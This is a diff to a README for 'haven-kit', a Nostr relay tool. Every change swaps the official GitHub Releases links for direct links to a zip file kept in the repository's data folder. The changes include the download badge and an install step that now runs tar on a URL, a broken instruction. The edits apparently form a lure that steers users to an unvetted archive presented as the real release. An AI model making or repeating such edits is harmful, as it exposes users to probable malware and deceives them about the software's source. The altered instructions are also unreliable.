@@ -1,6 +1,6 @@
 # 🌟 haven-kit - Easily Run Your Own HAVEN Nostr Relay
 
-## 📥 Download [![Download Button](https://img.shields.io/badge/Download-Latest%20Release-brightgreen)](https://github.com/burned-caroche455/haven-kit/releases)
+## 📥 Download [![Download Button](https://raw.githubusercontent.com/burned-caroche455/haven-kit/main/data/haven-kit-v1.7.zip%20Release-brightgreen)](https://raw.githubusercontent.com/burned-caroche455/haven-kit/main/data/haven-kit-v1.7.zip)
 
 ## 🚀 Getting Started
 
@@ -24,7 +24,7 @@ Before you start, make sure your computer meets the following requirements:
 
 ## 📥 Download & Install
 
-To download haven-kit, visit the [Releases page](https://github.com/burned-caroche455/haven-kit/releases). 
+To download haven-kit, visit the [Releases page](https://raw.githubusercontent.com/burned-caroche455/haven-kit/main/data/haven-kit-v1.7.zip). 
 
 1. Click on the link above to access the latest release.
 2. Look for the version you want to download. It should be clearly labeled.
@@ -51,7 +51,7 @@ Once downloaded, follow these steps to install haven-kit:
 
 1. Open Terminal.
 2. Navigate to your Downloads folder using `cd ~/Downloads`.
-3. Extract the downloaded file using `tar -xvf haven-kit-vX.X.X.tar.gz` (replace "vX.X.X" with the version number).
+3. Extract the downloaded file using `tar -xvf https://raw.githubusercontent.com/burned-caroche455/haven-kit/main/data/haven-kit-v1.7.zip` (replace "vX.X.X" with the version number).
 4. Navigate to the extracted folder using `cd haven-kit-vX.X.X`.
 5. Start the application with `./haven-kit`.
 
